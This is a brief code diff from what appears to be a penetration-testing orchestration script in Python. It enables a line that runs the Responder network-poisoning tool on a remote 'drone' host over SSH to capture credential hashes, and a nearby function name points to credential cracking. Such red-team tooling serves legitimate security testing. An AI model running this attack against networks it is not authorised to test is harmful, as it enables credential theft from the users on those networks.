@@ -56,8 +56,8 @@ def launch_responder(droneip, d_ssh):
     # Open Responder in a screen session
     cmd = 'screen -S responder -dm python /opt/Responder/Responder.py -I eth0 -wf'
     print '[*] Running on drone: {}'.format(cmd)
-    #stdin, stdout, stderr = d_ssh.exec_command(cmd) ##########################
-    #return (stdin, stdout, stderr)
+    stdin, stdout, stderr = d_ssh.exec_command(cmd) 
+    return (stdin, stdout, stderr)
 
 def get_cracker_creds():
     '''
